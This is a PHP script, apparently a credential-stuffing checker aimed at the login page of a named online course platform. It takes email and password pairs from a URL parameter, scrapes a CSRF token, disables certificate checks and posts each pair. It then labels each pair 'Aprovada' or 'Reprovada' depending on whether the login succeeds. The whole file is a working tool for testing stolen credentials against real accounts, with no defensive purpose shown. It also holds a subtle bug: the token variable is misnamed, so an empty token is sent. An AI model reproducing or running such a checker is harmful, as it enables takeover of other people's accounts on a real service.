<?php
error_reporting(0);
usleep(5);
if (file_exists("cookie.txt")!== false) {unlink("cookie.txt");fopen
("cookie.txt", 'w+');fclose
("cookie.txt");}else{fopen
  ("cookie.txt", 'w+');fclose
  ("cookie.txt");}

  function getStr($string, $start, $end) {
   $str = explode($start, $string);
   $str = explode($end, $str[1]);  
   return $str[0];
 }

 function multiexplode($string) {
   $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<");
   $one = str_replace($delimiters, $delimiters[0], $string);
   $two = explode($delimiters[0], $one);
   return $two;
 }

$lista = $_GET['lista'];
$email = multiexplode($lista)[0];
$senha = multiexplode($lista)[1];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://orama.myedools.com/users/sign_in');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE , getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'upgrade-insecure-requests: 1',
'sec-gpc: 1',
'sec-fetch-site: none',
'sec-fetch-mode: navigate',
'sec-fetch-user: ?1',
'sec-fetch-dest: document',
'accept-language: pt-BR,pt;q=0.9',
));

$p1 = curl_exec($ch);


$token = getStr($p1,'csrf-token" content="','"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://orama.myedools.com/users/sign_in');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE , getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'cache-control: max-age=0',
'upgrade-insecure-requests: 1',
'origin: https://orama.myedools.com',
'content-type: application/x-www-form-urlencoded',
'sec-gpc: 1',
'sec-fetch-site: same-origin',
'sec-fetch-mode: navigate',
'sec-fetch-user: ?1',
'sec-fetch-dest: document',
'referer: https://orama.myedools.com/users/sign_in',
'accept-language: pt-BR,pt;q=0.9',
));
curl_setopt($ch, CURLOPT_POSTFIELDS,'authenticity_token='.$tokens.'&user%5Borganization_id%5D=48286&user%5Bemail%5D='.$email.'&user%5Bpassword%5D='.$senha);
$p2 = curl_exec($ch);

if (strpos($p2,'Email e/ou senha inválidos')) {
  echo "Reprovada $lista";
}else{
  echo "Aprovada $lista";
}